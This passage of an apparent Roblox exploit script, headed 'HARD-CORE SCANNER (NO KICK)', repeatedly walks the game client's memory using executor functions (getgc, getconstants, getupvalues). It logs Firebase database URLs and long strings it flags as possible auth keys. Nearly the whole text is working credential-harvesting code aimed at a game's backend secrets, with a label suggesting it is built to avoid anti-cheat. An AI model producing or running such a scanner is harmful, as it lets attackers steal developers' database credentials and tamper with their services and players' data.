-- 2. HARD-CORE SCANNER (NO KICK)
-- ========================================== --
task.spawn(function()
    while true do
        -- Scan for URL and Keys in every possible memory location
        for _, f in pairs(getgc()) do
            if type(f) == "function" and islclosure(f) then
                -- Check Constants
                for _, c in pairs(getconstants(f)) do
                    if type(c) == "string" then
                        if c:find("firebaseio.com") then
                            AddLog("DATABASE_URL", c)
                        elseif #c > 35 and not c:find("/") then
                            AddLog("POTENTIAL_AUTH", c)
                        end
                    end
                end
                -- Check Upvalues
                for _, uv in pairs(getupvalues(f)) do
                    if type(uv) == "string" then
                        if uv:find("firebaseio.com") then
                            AddLog("DATABASE_URL", uv)
                        elseif #uv > 35 and not uv:find("/") then
                            AddLog("POTENTIAL_AUTH", uv)
                        end
                    end
                end
            end
        end
        task.wait(5) -- Scan every 5 seconds
    end
end)
